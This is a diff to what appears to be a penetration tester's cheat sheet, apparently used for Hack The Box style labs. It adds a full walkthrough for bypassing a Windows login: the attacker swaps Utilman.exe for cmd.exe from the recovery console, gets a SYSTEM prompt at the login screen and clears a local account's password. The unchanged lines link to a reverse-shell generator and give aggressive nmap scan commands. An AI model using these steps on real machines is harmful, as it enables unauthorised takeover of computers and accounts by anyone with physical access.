@@ -1,6 +1,19 @@
 TOOLS
 https://www.revshells.com/
 
+WINDOWS PASSWORD RESET:
+1. At the password screen: click Power icon (bottom-right) → hold Shift → click Restart → boots to Recovery.
+2. Troubleshoot → Advanced options → Command Prompt.
+3. In that prompt, confirm the Windows drive letter: dir C:\Windows (sometimes it's D: in recovery — check if C: fails).
+4. Swap in cmd as the accessibility tool:
+copy C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.exe.bak
+copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
+
+5. Restart back to the normal login screen.
+6. Click the accessibility icon (bottom-right of login screen) → opens a SYSTEM cmd prompt.
+7. Clear the password:
+net user VerificationPentest ""
+
 NMAP
 https://github.com/21y4d/nmapAutomator
 sudo nmap -sC -sV -oN AA.nmap AA.htb -v; sudo nmap -sS -sV -sC -T5 -p- -oN AA.full.nmap AA.htb -v
